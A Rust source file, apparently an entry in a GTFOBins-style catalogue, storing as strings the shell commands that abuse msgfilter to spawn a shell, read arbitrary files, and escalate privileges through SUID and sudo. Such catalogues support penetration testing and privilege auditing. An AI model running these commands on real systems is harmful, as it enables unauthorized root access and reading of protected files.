pub static BIN_NAME: &'static str = "msgfilter";
pub static SH_DESC: &'static str =
    "Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.";
pub static SH_CODE: &'static str = r#"
    
    echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
"#;
pub static FR_DESC: &'static str = "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other filter program.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    msgfilter -P -i "LFILE" /bin/cat
"#;
pub static SUID_DESC: &'static str =
    "Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which msgfilter) .

    echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
"#;
pub static SUDO_DESC: &'static str =
    "Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.";
pub static SUDO_CODE: &'static str = r#"
    
    echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
